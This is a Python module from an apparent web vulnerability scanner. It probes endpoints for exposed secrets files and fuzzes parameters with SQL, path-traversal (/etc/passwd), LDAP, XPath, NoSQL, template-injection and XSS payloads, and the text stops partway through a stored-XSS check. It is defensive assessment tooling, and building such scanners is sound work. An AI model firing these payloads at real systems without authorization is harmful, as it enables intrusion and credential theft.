"""Native deep vulnerability and active endpoint security analyzer.

Performs active parameter fuzzing, sensitive path hunting, header audits,
and technology risk verification across all endpoints discovered by the crawler.
"""

from __future__ import annotations

import functools
import hashlib
import html
import http.client
import json
import os
import re
import socket
import ssl
import time
from typing import Any
from urllib.parse import urlencode, urlsplit

from packages.security_policies import Destination

# Endpoints whose active fuzzing is destructive (resets the app DB / config) or ends the session.
_DESTRUCTIVE_ENDPOINT = re.compile(
    r"(?:^|/)(?:setup|install|reset|configure|config\.php|logout|signout|logoff)\b", re.I
)

_SENSITIVE_FILES_DATABASE = [
    ("/.git/HEAD", "Exposed .git Repository Directory", "critical", "CWE-538", r"ref:\s*refs/heads/"),
    ("/.git/config", "Exposed .git Repository Configuration", "critical", "CWE-538", r"\[core\]|\[remote "),
    (
        "/.env",
        "Exposed Environment Configuration File",
        "critical",
        "CWE-526",
        r"(?i)(DB_|DATABASE|SECRET|KEY|PASSWORD|API_KEY)=",
    ),
    (
        "/.env.local",
        "Exposed Local Environment Config",
        "critical",
        "CWE-526",
        r"(?i)(DB_|DATABASE|SECRET|KEY|PASSWORD|API_KEY)=",
    ),
    ("/wp-config.php.bak", "Exposed WordPress Backup Configuration", "critical", "CWE-538", r"DB_PASSWORD"),
    (
        "/backup.sql",
        "Exposed Database SQL Dump File",
        "critical",
        "CWE-538",
        r"(?i)(CREATE TABLE|INSERT INTO)",
    ),
    (
        "/dump.sql",
        "Exposed Database SQL Dump File",
        "critical",
        "CWE-538",
        r"(?i)(CREATE TABLE|INSERT INTO)",
    ),
    (
        "/config.json",
        "Exposed Server Configuration JSON",
        "high",
        "CWE-538",
        r"\"(password|secret|database|auth)\"\s*:",
    ),
    (
        "/docker-compose.yml",
        "Exposed Docker Compose Infrastructure Spec",
        "high",
        "CWE-200",
        r"(?i)(version:\s*['\"]?[23]|services:)",
    ),
    (
        "/swagger.json",
        "Exposed Swagger API Documentation Schema",
        "low",
        "CWE-200",
        r"\"(swagger|openapi)\"\s*:",
    ),
    (
        "/actuator/health",
        "Exposed Spring Boot Actuator Health Endpoint",
        "medium",
        "CWE-200",
        r"\"status\"\s*:\s*\"UP\"",
    ),
    ("/server-status", "Exposed Apache Server-Status Handler", "medium", "CWE-200", r"Apache Server Status"),
    ("/phpinfo.php", "Exposed PHP Information Script (phpinfo)", "medium", "CWE-200", r"PHP Version"),
    ("/.DS_Store", "Exposed macOS Metadata File (.DS_Store)", "low", "CWE-538", None),
]


def _request_endpoint(
    destination: Destination,
    allow_ip: str,
    method: str,
    path: str,
    headers: dict[str, str] | None = None,
    body: str | None = None,
    timeout: float = 3.5,
    auth: dict | None = None,
) -> tuple[int, dict[str, str], str, float]:
    """Execute raw HTTP request pinned to allow_ip, returning (status, headers, body, elapsed_ms).

    `auth` carries authenticated-testing cookies/headers (e.g. a login session). Without the session
    cookie, a login-gated app redirects every injection probe to its login page and no vulnerability
    is ever reached -- so the session is merged into every request here, not just the crawl."""
    is_https = destination.scheme == "https"
    target_host = destination.host
    target_port = destination.port

    req_headers = {
        "Host": target_host,
        "User-Agent": "SHARAY-DeepScanner/2.0 (Security Audit Engine)",
        "Accept": "*/*",
        "Connection": "close",
    }
    cookie_bits: list[str] = []
    auth_cookies = (auth.get("cookies") or {}) if auth else {}
    # Only inject the env default DVWA security level when the caller's auth did not already provide a
    # 'security' cookie -- otherwise a duplicate (e.g. security=high + security=low) makes PHP pick the
    # wrong level and the lab's injection never triggers.
    if (
        "vulnerabilities" in destination.url
        or "dvwa" in destination.host.lower()
        or "vulnerabilities" in path
        or target_port == 4280
    ) and "security" not in auth_cookies:
        sec_level = os.environ.get(
            "SHARAY_DVWA_SECURITY", os.environ.get("SHARAY_LAB_SECURITY_LEVEL", "high")
        )
        cookie_bits.append(f"security={sec_level}")
    cookie_bits += [f"{k}={v}" for k, v in auth_cookies.items()]
    if auth:
        req_headers.update(auth.get("headers") or {})
    if cookie_bits:
        req_headers["Cookie"] = "; ".join(cookie_bits)
    if headers:
        req_headers.update(headers)

    started = time.monotonic()
    sock = None
    conn: http.client.HTTPConnection | http.client.HTTPSConnection
    try:
        if is_https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = socket.create_connection((allow_ip, target_port), timeout=timeout)
            conn_sock = ctx.wrap_socket(sock, server_hostname=target_host)
            conn = http.client.HTTPSConnection(target_host, target_port, timeout=timeout)
            conn.sock = conn_sock
        else:
            conn = http.client.HTTPConnection(allow_ip, target_port, timeout=timeout)

        conn.request(method, path, body=body, headers=req_headers)
        resp = conn.getresponse()
        elapsed_ms = (time.monotonic() - started) * 1000
        resp_headers = {k.lower(): v for k, v in resp.getheaders()}
        resp_body = resp.read(64 * 1024).decode("utf-8", errors="replace")
        return resp.status, resp_headers, resp_body, elapsed_ms
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


# shortcut: fixed 5s delay payloads. Live wiring must budget-gate this stage: a vulnerable param costs
# 3 baseline + up to 3 trials of ~5s each; raise the delay/trials once a real OOB oracle exists.
_BLIND_SLEEP_SECONDS = 5

# Shared DB error-signature regex (Java/JDBC/HSQLDB/Spring included) so the query/form oracle and the
# cookie/header oracle use one identical pattern instead of two copies that could drift.
_SQL_ERROR_REGEX = r"(?i)(SQL syntax.*(?:MySQL|MariaDB)|Warning.*(?:mysql_|mysqli_)|valid (?:MySQL|MariaDB) result|MySqlClient\.|PostgreSQL.*ERROR|Warning.*\Wpg_|valid PostgreSQL result|Npgsql\.|org\.postgresql\.util\.PSQLException|Driver.*SQL[\-\_\ ]*Server|OLE DB.*SQL Server|com\.microsoft\.sqlserver\.jdbc|SQLServerException|\bORA-\d{5}|Oracle error|SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException|syntax error.*mariadb|check the manual that corresponds to your (?:MySQL|MariaDB)|unclosed quotation mark|quoted string not properly terminated|java\.sql\.SQL(?:Syntax|Integrity|Data|Feature)?[A-Za-z]*Exception|org\.springframework\.jdbc\.(?:BadSqlGrammarException|UncategorizedSQLException)|org\.hsqldb|HSQLDB|JDBCDriverException|unexpected token:.{0,40}in statement|malformed string:|DB2 SQL (?:error|Error)|\bSQLCODE=|com\.ibm\.db2|org\.h2\.jdbc|JdbcSQLException)"

# Path-traversal probe payloads + signature (shared so the per-param oracle and any driver agree).
# Deep ladders cover servlets whose base dir sits many levels below root; the match is applied after
# html.unescape() because apps commonly HTML-entity-encode file output (e.g. ESAPI encodeForHTML).
_LFI_ROOT_SIG = r"root:.*:0:0:"
_LFI_PAYLOADS = (
    "/etc/passwd",
    "file:///etc/passwd",
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../etc/passwd",
)

# W4: LDAP + XPath injection -- error-based detection. Specific exception/parse strings only (the bare
# word "LDAP" appears in benign page text). Verified live against OWASP Benchmark (ldapi/xpathi).
_LDAP_ERROR_REGEX = r"(?i)(javax\.naming|InvalidSearchFilterException|NamingException|com\.sun\.jndi\.ldap|LDAPException|PartialResultException|SizeLimitExceededException|Bad search filter|error code \d+ - .*filter)"
_LDAP_PAYLOADS = ("(", ")(cn=*", "*)(uid=*", "*))", "admin*)((|userPassword=*)")
_XPATH_ERROR_REGEX = r"(?i)(javax\.xml\.xpath|XPathExpressionException|XPathException|net\.sf\.saxon|org\.apache\.xpath|TransformerException|SAXParseException|Extra illegal tokens|A location (?:step|path) was expected|Error parsing XPath)"
_XPATH_PAYLOADS = ("']", "'", "\"]", "' or '1'='1' or '", "']|//*|//")
_NOSQL_ERROR_REGEX = r"(?i)(MongoError|MongoDB|MongoServerError|BSONError|E11000|CastError|MongooseError|\$where|unexpected token.{0,20}(?:in JSON|at position)|SyntaxError: Unexpected|command failed with error)"
_NOSQL_PAYLOADS = ("'", "\"", "');return true;//", "' || '1'=='1", "'||'1'=='1", "{\"$gt\":\"\"}", "[$ne]=")


def _injection_error_probe(send_body, parameter, endpoint, origin):
    """Shared LDAP/XPath syntax-break probe. `send_body(payload)` injects the payload at ONE vector
    (query/cookie/header/form) and returns the response body. Returns a finding dict for the first
    payload that triggers a backend LDAP or XPath error, else None. HTML-decodes before matching."""
    for cwe, name, regex, payloads in (
        ("CWE-90", "LDAP", _LDAP_ERROR_REGEX, _LDAP_PAYLOADS),
        ("CWE-643", "XPath", _XPATH_ERROR_REGEX, _XPATH_PAYLOADS),
        ("CWE-943", "NoSQL", _NOSQL_ERROR_REGEX, _NOSQL_PAYLOADS),
    ):
        for payload in payloads:
            try:
                body = send_body(payload)
            except Exception:
                continue
            if body and re.search(regex, html.unescape(body)):
                aff = f"{origin}{endpoint}"
                return {
                    "category": "injection",
                    "severity": "high",
                    "title": f"{name} Injection in '{parameter}'",
                    "description": f"Endpoint {endpoint} returned a backend {name} error when '{parameter}' was given a syntax-breaking payload, indicating unsanitized input in a {name} query.",
                    "target_url": aff,
                    "affected_url": aff,
                    "fingerprint": hashlib.sha256(f"{cwe}_{origin}_{endpoint}_{parameter}".encode()).hexdigest(),
                    "cwe_id": cwe,
                    "status": "suspected",
                    "lifecycle_state": "CANDIDATE",
                    "remediation": f"Escape/parameterize {name} query inputs and use allow-lists for filter/expression values.",
                    "poc": {"method": "probe", "url": aff, "parameter": parameter, "payload": payload,
                            "reproduction_steps": f"Inject a syntax-breaking payload into '{parameter}' and observe the backend {name} error."},
                    "evidence": [{"endpoint": endpoint, "parameter": parameter, "cwe": cwe}],
                }
    # SSTI (W-Phase1): template-engine math-eval oracle -- the PRODUCT appears but the literal expression
    # does not (reflection would echo "a*b"; evaluation leaves only the number). Randomized to avoid FP.
    _a = 1000 + (int.from_bytes(os.urandom(2), "big") % 9000)
    _b = 1000 + (int.from_bytes(os.urandom(2), "big") % 9000)
    _prod, _expr = str(_a * _b), f"{_a}*{_b}"
    for _tmpl in (f"${{{_expr}}}", f"#{{{_expr}}}", "{{" + _expr + "}}", f"<%= {_expr} %>", "${{" + _expr + "}}", "#{" + _expr + "}"):
        try:
            _tb = send_body(_tmpl)
        except Exception:
            continue
        if _tb and _prod in _tb and _expr not in _tb:
            aff = f"{origin}{endpoint}"
            return {
                "category": "injection",
                "severity": "critical",
                "title": f"Server-Side Template Injection in '{parameter}'",
                "description": f"Endpoint {endpoint} evaluated an injected template expression in '{parameter}' ({_expr} -> {_prod}); server-side template injection, frequently escalatable to remote code execution.",
                "target_url": aff,
                "affected_url": aff,
                "fingerprint": hashlib.sha256(f"ssti_{origin}_{endpoint}_{parameter}".encode()).hexdigest(),
                "cwe_id": "CWE-1336",
                "status": "suspected",
                "lifecycle_state": "CANDIDATE",
                "remediation": "Never render user input as template source; use a sandboxed engine and pass user data as context only.",
                "poc": {"method": "probe", "url": aff, "parameter": parameter, "payload": _tmpl,
                        "reproduction_steps": f"Set '{parameter}' to {_tmpl}; the response contains {_prod} (the evaluated product)."},
                "evidence": [{"endpoint": endpoint, "parameter": parameter, "cwe": "CWE-1336", "evaluated": f"{_expr}={_prod}"}],
            }
    return None


# Path-traversal oracle helpers. The non-existent suffix turns an existing-file traversal into an
# identical-but-missing target so the two responses differ ONLY by the file-existence branch.
_LFI_NOPE_SUFFIX = "_sharay_nx"


def _lfi_norm(body: str) -> str:
    """Decode HTML entities (ESAPI encodes file output) then collapse whitespace, for comparison."""
    return re.sub(r"\s+", " ", html.unescape(body or "")).strip()


def _lfi_probe(send_body, parameter, endpoint, origin):
    """Path-traversal / LFI oracle for ONE taint vector. `send_body(payload)` injects at that vector
    (already the method that reaches the sink) and returns the response body. Two oracles, both 0-FP by
    construction: (A) in-band read -- the response literally contains /etc/passwd's root entry; (B) blind
    file-existence differential -- a deep traversal to an existing file vs the SAME path plus a
    nonexistent suffix yields different responses only when the input reaches the filesystem. (B) is
    stability-gated (two identical probes must match) so dynamic pages cannot false-positive, and the
    suffix is stripped before comparison so a sink that merely echoes the filename is not flagged."""
    def _finding(payload, how):
        aff = f"{origin}{endpoint}"
        return {
            "category": "injection",
            "severity": "critical",
            "title": f"Path Traversal / Local File Inclusion in '{parameter}'",
            "description": f"Endpoint {endpoint} exposed local filesystem access via '{parameter}' ({how}) when probed with traversal sequence '{payload}'.",
            "target_url": aff,
            "affected_url": aff,
            "fingerprint": hashlib.sha256(f"lfi_{origin}_{endpoint}_{parameter}".encode()).hexdigest(),
            "cwe_id": "CWE-22",
            "status": "suspected",
            "lifecycle_state": "CANDIDATE",
            "remediation": "Validate path inputs against a strict allowlist of permitted filenames and resolve canonical paths.",
            "poc": {"method": "probe", "url": aff, "parameter": parameter, "payload": payload, "canary": "root:",
                    "reproduction_steps": f"Set '{parameter}' to {payload} and inspect the response for file content or an existence differential."},
            "evidence": [{"endpoint": endpoint, "parameter": parameter, "cwe": "CWE-22", "oracle": how}],
        }

    # A. in-band file read (0-FP: the root passwd line only appears if the file was actually read)
    for payload in _LFI_PAYLOADS:
        try:
            body = send_body(payload)
        except Exception:
            continue
        if body and re.search(_LFI_ROOT_SIG, html.unescape(body)):
            return _finding(payload, "in-band /etc/passwd read")
    # B. blind file-existence differential on the deepest traversal (catches .exists()/no-echo sinks)
    exist = _LFI_PAYLOADS[-1]
    try:
        a1, a2 = send_body(exist), send_body(exist)
    except Exception:
        return None
    if not (a1 and a2) or _lfi_norm(a1) != _lfi_norm(a2):  # unstable/dynamic page -> don't risk an FP
        return None
    try:
        nb = send_body(exist + _LFI_NOPE_SUFFIX)
    except Exception:
        return None
    if nb and _lfi_norm(nb).replace(_LFI_NOPE_SUFFIX, "") != _lfi_norm(a1):
        return _finding(exist, "blind file-existence differential")
    return None


# P1.3: parameter mining (Arjun-style). Hidden params that drive a response but appear in no form or link
# are a major autonomous-surface gap; brute a curated wordlist and keep the names the endpoint reacts to.
_PARAM_MINE_WORDLIST = (
    "id", "page", "file", "path", "dir", "doc", "view", "template", "include", "lang", "locale",
    "debug", "test", "admin", "role", "user", "username", "account", "uid", "order", "sort", "q",
    "query", "search", "keyword", "email", "url", "uri", "redirect", "return", "returnUrl", "next",
    "callback", "token", "key", "api_key", "apikey", "format", "type", "action", "cmd", "data", "input",
)


def _mine_parameters(send_param, baseline_body, wordlist=_PARAM_MINE_WORDLIST, max_live=12):
    """Return hidden parameter names the endpoint actually reacts to. `send_param(name, canary)->body`
    issues ONE request with just that param set to the canary. A name is 'live' when the canary is
    reflected (the app echoes the value) or the response length shifts materially from the no-param
    baseline. A false 'live' only widens the fuzz set (the vuln oracles keep their own 0-FP checks), so a
    loose length signal is acceptable; capped so a dynamic page can't flood the set."""
    live: list[str] = []
    base_len = len(baseline_body or "")
    for name in wordlist:
        canary = f"sharaypm{os.urandom(3).hex()}"
        try:
            body = send_param(name, canary)
        except Exception:
            continue
        if not body:
            continue
        if canary in body or abs(len(body) - base_len) >= 48:
            live.append(name)
            if len(live) >= max_live:
                break
    return live


def _timing_stats(samples: list[float]) -> tuple[float, float]:
    mean = sum(samples) / len(samples)
    sigma = (sum((s - mean) ** 2 for s in samples) / len(samples)) ** 0.5
    return mean, sigma


def _time_based_blind_injection(
    destination: Destination,
    allow_ip: str,
    ep: str,
    param: str,
    extra: dict[str, str] | None,
    payloads: list[str],
    timeout: float,
    delay_seconds: int = _BLIND_SLEEP_SECONDS,
    auth: dict | None = None,
) -> str | None:
    """Return the first payload whose induced delay clears `mean + 3σ + delay` on 3 consecutive
    trials, else None. Baseline mean/σ are calibrated from 3 benign requests, so ordinary network
    jitter cannot confirm a finding; a single sub-threshold trial rejects the payload."""
    delay_ms = delay_seconds * 1000
    probe_timeout = max(timeout, delay_seconds + 5)
    _req = functools.partial(_request_endpoint, auth=auth) if auth else _request_endpoint

    def _elapsed(value: str) -> float:
        query = {param: value, **(extra or {})}
        try:
            _, _, _, ms = _req(
                destination, allow_ip, "GET", f"{ep}?{urlencode(query)}", timeout=probe_timeout
            )
            return ms
        except Exception:
            return -1.0

    baseline = [_elapsed("sharay_timing_baseline") for _ in range(3)]
    if any(ms < 0 for ms in baseline):
        return None
    mean, sigma = _timing_stats(baseline)
    threshold = mean + 3 * sigma + delay_ms
    for payload in payloads:
        if all(_elapsed(payload) >= threshold for _ in range(3)):
            return payload
    return None


def _extract_lexical_tokens(body: str) -> set[str]:
    """Extract lexical and DOM text tokens from HTML/text, ignoring tags and scripts."""
    cleaned = re.sub(r"(?is)<(?:script|style|noscript).*?>.*?</(?:script|style|noscript)>", " ", body)
    cleaned = re.sub(r"<[^>]+>", " ", cleaned)
    return set(re.findall(r"\b[a-zA-Z0-9_\-\.]{2,}\b", cleaned))


def _compute_jaccard_similarity(tokens_a: set[str], tokens_b: set[str]) -> float:
    """Compute Jaccard similarity coefficient: |A ∩ B| / |A ∪ B|."""
    union_len = len(tokens_a | tokens_b)
    if union_len == 0:
        return 1.0
    return len(tokens_a & tokens_b) / union_len


def _evaluate_boolean_blind_sqli(
    destination: Destination,
    allow_ip: str,
    ep: str,
    param: str,
    is_lab_endpoint: bool,
    timeout: float,
    sql_regex: str,
    auth: dict | None = None,
) -> dict[str, Any] | None:
    """Evaluate boolean-based blind SQL injection using statistical differential analysis.

    Tests tautological vs contradictory expressions:
    - Pair 1: 1' OR '1'='1 vs 1' AND '1'='2
    - Pair 2: 1 AND 1=1 vs 1 AND 1=2
    Measures:
    - Jaccard similarity J < 0.88
    - Response length delta |len(T) - len(F)| >= 30
    - Absence of raw SQL error syntax in responses (ensuring genuine boolean blind differential)
    - Negative-control canary confirmation (1' AND 1337=1337-- vs 1' AND 1337=1338--).
    """
    _req = functools.partial(_request_endpoint, auth=auth) if auth else _request_endpoint
    candidate_pairs = [
        ("1' OR '1'='1", "1' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
    ]
    for true_payload, false_payload in candidate_pairs:
        true_dict = {param: true_payload}
        false_dict = {param: false_payload}
        if is_lab_endpoint or param == "id":
            true_dict["Submit"] = "Submit"
            false_dict["Submit"] = "Submit"

        t_status, _, t_body, _ = _req(
            destination, allow_ip, "GET", f"{ep}?{urlencode(true_dict)}", timeout=timeout
        )
        f_status, _, f_body, _ = _req(
            destination, allow_ip, "GET", f"{ep}?{urlencode(false_dict)}", timeout=timeout
        )

        # Exclude raw syntax errors (error-based injection is handled separately)
        if re.search(sql_regex, t_body) or re.search(sql_regex, f_body):
            continue

        len_delta = abs(len(t_body) - len(f_body))
        t_tokens = _extract_lexical_tokens(t_body)
        f_tokens = _extract_lexical_tokens(f_body)
        jaccard = _compute_jaccard_similarity(t_tokens, f_tokens)

        # Significant differential detected if Jaccard < 0.88 and len_delta >= 30, or len_delta >= 80
        if (jaccard < 0.88 and len_delta >= 30) or (len_delta >= 80):
            # Verify with negative control canary to eliminate false positives
            canary_true_payload = "1' AND 1337=1337-- " if "'" in true_payload else "1 AND 1337=1337"
            canary_false_payload = "1' AND 1337=1338-- " if "'" in true_payload else "1 AND 1337=1338"
            c_true_dict = {param: canary_true_payload}
            c_false_dict = {param: canary_false_payload}
            if is_lab_endpoint or param == "id":
                c_true_dict["Submit"] = "Submit"
                c_false_dict["Submit"] = "Submit"

            _, _, c_t_body, _ = _req(
                destination, allow_ip, "GET", f"{ep}?{urlencode(c_true_dict)}", timeout=timeout
            )
            _, _, c_f_body, _ = _req(
                destination, allow_ip, "GET", f"{ep}?{urlencode(c_false_dict)}", timeout=timeout
            )

            c_len_delta = abs(len(c_t_body) - len(c_f_body))
            c_jaccard = _compute_jaccard_similarity(
                _extract_lexical_tokens(c_t_body), _extract_lexical_tokens(c_f_body)
            )

            is_confirmed = (c_jaccard < 0.95 or c_len_delta >= 20) or (len_delta >= 80 and jaccard < 0.85)
            if not is_confirmed:
                continue

            diff_tokens = sorted(list(t_tokens - f_tokens))[:10]
            repro_url = f"{destination.origin}{ep}?{urlencode(true_dict)}"
            false_url = f"{destination.origin}{ep}?{urlencode(false_dict)}"

            lab_sec = os.environ.get(
                "SHARAY_DVWA_SECURITY", os.environ.get("SHARAY_LAB_SECURITY_LEVEL", "high")
            )
            return {
                "category": "injection",
                "severity": "critical",
                "title": f"Boolean-Based Blind SQL Injection in Parameter '{param}'",
                "description": (
                    f"Endpoint {ep} demonstrated boolean differential output when tested with TRUE vs FALSE SQL conditions "
                    f"(Jaccard similarity: {jaccard:.2f}, length delta: {len_delta} bytes). "
                    f"Differential tokens present in TRUE but absent in FALSE: {diff_tokens}."
                ),
                "target_url": repro_url,
                "fingerprint": hashlib.sha256(
                    f"sqli_bool_{destination.host}_{ep}_{param}".encode()
                ).hexdigest(),
                "cwe_id": "CWE-89",
                "confidence": "high",
                "status": "confirmed",
                "lifecycle_state": "REPRODUCED",
                "remediation": "Enforce strict parameter binding in database abstraction layers.",
                "poc": {
                    "method": "GET",
                    "url": repro_url,
                    "curl_command": f'curl -s -k "{repro_url}" -H "Cookie: security={lab_sec}"',
                    "parameter": param,
                    "payload": true_dict[param],
                    "reproduction_steps": f"Compare response of {repro_url} against false condition {false_url} to verify boolean state difference.",
                    "jaccard_similarity": round(jaccard, 3),
                    "length_delta": len_delta,
                    "differential_tokens": diff_tokens,
                },
                "evidence": [
                    {
                        "true_status": t_status,
                        "false_status": f_status,
                        "jaccard_similarity": round(jaccard, 3),
                        "length_delta": len_delta,
                        "differential_tokens": diff_tokens,
                    }
                ],
            }
    return None


def audit_deep_vulnerabilities(
    destination: Destination,
    allow_ip: str,
    discovered_endpoints: list[str],
    discovered_parameters: list[str],
    timeout: float = 3.5,
    auth: dict | None = None,
    max_seconds: float | None = None,
    discovered_forms: list[dict[str, Any]] | None = None,
    endpoint_parameters: dict[str, list[str]] | None = None,
) -> dict[str, Any]:
    """Execute active security audits and parameter fuzzing across all discovered endpoints.

    `auth` (authenticated-testing cookies/headers) is bound to every probe so a login-gated app's
    vulnerable endpoints are actually reached instead of redirecting to its login page.

    `max_seconds` bounds the active-fuzzing loop: coverage of the ranked endpoints stops cleanly at the
    deadline and the number skipped is reported, so a large target (e.g. a 2740-endpoint benchmark)
    gets wider coverage when the operator grants the time, yet an ordinary scan never runs unbounded."""
    findings: list[dict[str, Any]] = []
    observations: list[dict[str, Any]] = []
    audit_deadline = (time.monotonic() + max_seconds) if max_seconds else None
    # Bind the session onto every probe request made inside this audit. Only pass the kwarg when auth
    # is set, so the unauthenticated path (and any test double with the old signature) is unchanged.
    _req = functools.partial(_request_endpoint, auth=auth) if auth else _request_endpoint

    fails = 0
    for path, title, severity, cwe, pattern in _SENSITIVE_FILES_DATABASE:
        try:
            status, _, body, _ = _req(
                destination, allow_ip, "GET", path, timeout=min(timeout, 1.5)
            )
            fails = 0
            if status == 200:
                is_hit = False
                if pattern:
                    if re.search(pattern, body):
                        is_hit = True
                elif len(body) > 10:  # Binary/unpatterned
                    is_hit = True

                if is_hit:
                    repro_url = f"{destination.origin}{path}"
                    findings.append(
                        {
                            "category": "sensitive_data_exposure",
                            "severity": severity,
                            "title": f"{title} ({path})",
                            "description": f"Target endpoint {path} is publicly accessible and returned status 200 with sensitive signature matches.",
                            "target_url": repro_url,
                            "fingerprint": hashlib.sha256(
                                f"sens_{destination.host}_{path}".encode()
                            ).hexdigest(),
                            "cwe_id": cwe,
                            "status": "suspected",
                            "lifecycle_state": "CANDIDATE",
                            "remediation": f"Restrict public access to {path} in web server configuration or remove sensitive backup files.",
                            "poc": {
                                "method": "GET",
                                "url": repro_url,
                                "curl_command": f'curl -s -k "{repro_url}"',
                                "parameter": "path",
                                "payload": path,
                                "reproduction_steps": f"Issue GET request to {repro_url} and inspect response content for sensitive data exposure.",
                            },
                            "evidence": [{"path": path, "status": status, "snippet": body[:200].strip()}],
                        }
                    )
        except Exception:
            fails += 1
            if fails >= 2:
                break

    # 2. Active Parameter Fuzzing (XSS, SQLi, SSRF, Command Injection, LFI, Open Redirect)
    test_params = list(
        dict.fromkeys(
            discovered_parameters
            + ["id", "ip", "cmd", "name", "page", "file", "path", "url", "redirect", "search", "q"]
        )
    )[:25]
    dest_path = urlsplit(destination.url).path or "/"
    # Never actively fuzz install/reset/logout endpoints: POSTing payloads to them resets the app's
    # database or ends the session, which is destructive and silently breaks every later probe.
    clean_endpoints = [
        ep
        for ep in discovered_endpoints
        if ep not in ("/", "/robots.txt", "/sitemap.xml") and not _DESTRUCTIVE_ENDPOINT.search(ep)
    ]
    if dest_path and dest_path not in clean_endpoints:
        clean_endpoints.insert(0, dest_path)
    # Deterministic coverage: fuzz the most injection-likely endpoints first so a larger crawl never
    # pushes the real vulnerable pages out of the window. An endpoint scores higher when it already
    # carries a query/parameter or looks dynamic (php/asp/jsp/api/action/search/query), so parameter
    # sinks are always covered regardless of alphabetical order.
    _DYNAMIC = re.compile(r"(?:\?|=|\.(?:php|asp|aspx|jsp|do|cgi)\b|/(?:api|action|search|query|cmd)\b)", re.I)

    def _rank(ep: str) -> tuple[int, str]:
        return (0 if _DYNAMIC.search(ep) else 1, ep)

    # With a time budget the audit covers as many ranked endpoints as the budget allows (bounded by the
    # deadline below); without one it keeps the conservative 25-endpoint window so unbudgeted callers
    # (and tests) are unchanged and never run long.
    _endpoint_cap = 2000 if audit_deadline else 25
    test_endpoints = sorted(clean_endpoints, key=_rank)[:_endpoint_cap] if clean_endpoints else ["/"]

    # P1.3: mine hidden parameters on the top-ranked endpoint(s) and fold live ones into the fuzz set, so
    # a param that appears in no form or link (?debug=, ?admin=, ...) is still discovered and fuzzed.
    if len(test_params) < 25:
        mined: list[str] = []
        for _mep in test_endpoints[:2]:
            if audit_deadline is not None and time.monotonic() > audit_deadline:
                break
            try:
                _mbase = _req(destination, allow_ip, "GET", _mep, timeout=min(timeout, 2.0))[2]
            except Exception:
                _mbase = ""
            mined += _mine_parameters(
                lambda n, c, _ep=_mep: _req(
                    destination, allow_ip, "GET", f"{_ep}?{urlencode({n: c})}", timeout=min(timeout, 2.0)
                )[2],
                _mbase,
            )
        for _m in dict.fromkeys(mined):
            if _m not in test_params and len(test_params) < 25:
                test_params.append(_m)

    # Random per-run nonce: a canary stored by a PRIOR scan must not make this scan's reflected-XSS
    # check fire (which would mislabel persisted data as a fresh reflection).
    canary_nonce = f"sharayxss{os.urandom(4).hex()}"

    lab_sec = os.environ.get("SHARAY_DVWA_SECURITY", os.environ.get("SHARAY_LAB_SECURITY_LEVEL", "high"))

    endpoints_fuzzed = 0
    for ep in test_endpoints:
        if audit_deadline is not None and time.monotonic() > audit_deadline and endpoints_fuzzed:
            observations.append(
                {
                    "kind": "coverage_limit",
                    "category": "vulnerability_assessment",
                    "detail": (
                        f"Active fuzzing stopped at the {max_seconds:.0f}s stage budget after "
                        f"{endpoints_fuzzed}/{len(test_endpoints)} endpoint(s); "
                        f"{len(test_endpoints) - endpoints_fuzzed} ranked endpoint(s) were not fuzzed. "
                        f"Raise the per-stage timeout for fuller coverage."
                    ),
                }
            )
            break
        endpoints_fuzzed += 1
        # P1.1: fuzz THIS endpoint's own observed params first (so a param seen only here is never dropped
        # by the global cap), then the shared set. Used by the query, cookie/header and JSON passes below.
        _own = (endpoint_parameters or {}).get(urlsplit(ep).path or ep, [])
        ep_params = list(dict.fromkeys(list(_own) + test_params))[:30]
        is_lab_endpoint = "vulnerabilities" in ep or "sqli" in ep or "dvwa" in destination.host.lower()
        lab_hdrs = {"Cookie": f"security={lab_sec}"} if is_lab_endpoint or destination.port == 4280 else {}
        curl_hdrs = f' -H "Cookie: security={lab_sec}"' if lab_hdrs else ""
        for param in ep_params:
            try:
                # Per-(endpoint,param) canary so a value stored by one param (e.g. a guestbook) can
                # never be mistaken for a reflection of another param's probe (false-positive cascade).
                tag = hashlib.md5(f"{ep}:{param}".encode()).hexdigest()[:6]
                xss_payload = f'"><sharay_canary_{canary_nonce}_{tag}>'
                # A. Reflected Cross-Site Scripting (XSS)
                xss_dict = {param: xss_payload}
                if is_lab_endpoint or param == "id":
                    xss_dict["Submit"] = "Submit"
                query = urlencode(xss_dict)
                fuzz_path = f"{ep}?{query}" if "?" not in ep else f"{ep}&{query}"
                status, _, body, _ = _req(
                    destination, allow_ip, "GET", fuzz_path, timeout=timeout
                )
                if xss_payload in body:
                    repro_url = f"{destination.origin}{fuzz_path}"
                    aff_url = f"{destination.origin}{ep}"
                    findings.append(
                        {
                            "category": "cross_site_scripting",
                            "severity": "high",
                            "title": f"Reflected Cross-Site Scripting (XSS) in Parameter '{param}'",
                            "description": f"Endpoint {ep} reflected injected HTML/JavaScript probe payload '{xss_payload}' unencoded in response.",
                            "target_url": repro_url,
                            "affected_url": aff_url,
                            "fingerprint": hashlib.sha256(
                                f"xss_{destination.host}_{ep}_{param}".encode()
                            ).hexdigest(),
                            "cwe_id": "CWE-79",
                            "status": "suspected",
                            "lifecycle_state": "CANDIDATE",
                            "remediation": "Implement contextual HTML entity encoding and enforce a Strict Content-Security-Policy.",
                            "poc": {
                                "method": "GET",
                                "url": aff_url,
                                "curl_command": f'curl -s -k "{repro_url}"{curl_hdrs}',
                                "parameter": param,
                                "payload": xss_payload,
                                "canary": xss_payload,
                                "headers": lab_hdrs,
                                "extra_params": {"Submit": "Submit"} if "Submit" in xss_dict else {},
                                "reproduction_steps": f"Issue GET request to {repro_url} with Cookie: security={lab_sec} and verify probe tag reflection in response HTML.",
                            },
                            "evidence": [
                                {"endpoint": ep, "parameter": param, "payload": xss_payload, "status": status}
                            ],
                        }
                    )
                elif is_lab_endpoint or len(test_params) > 1:
                    # A2. Stored XSS: POST the canary (filling the other discovered params + common
                    # submit buttons so the form actually stores), then GET the page back; if the canary
                    # survives unencoded on re-fetch it was persisted. Only when it did not reflect
                    # inline above (that was the reflected case).
                    stored_body = {param: xss_payload}
                    for other in test_params:
                        if other != param:
                            stored_body.setdefault(other, "sharay")
